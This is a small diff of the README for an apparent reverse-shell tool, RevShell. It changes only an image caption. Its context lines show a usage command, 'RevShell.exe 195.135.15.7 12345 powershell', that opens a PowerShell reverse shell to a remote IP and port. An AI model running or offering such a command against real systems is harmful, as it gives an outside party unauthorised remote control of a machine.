@@ -41,5 +41,5 @@ C:\RevShell> RevShell.exe 195.135.15.7 12345 powershell
 [+] VALID IP PORT:      12345
 ```
 
-![Image of Cracked Pattern](https://github.com/AleDiBen/RevShell/blob/master/example.png)\
+![RevShell.exe in action](https://github.com/AleDiBen/RevShell/blob/master/example.png)\
 _RevShell.exe in action._
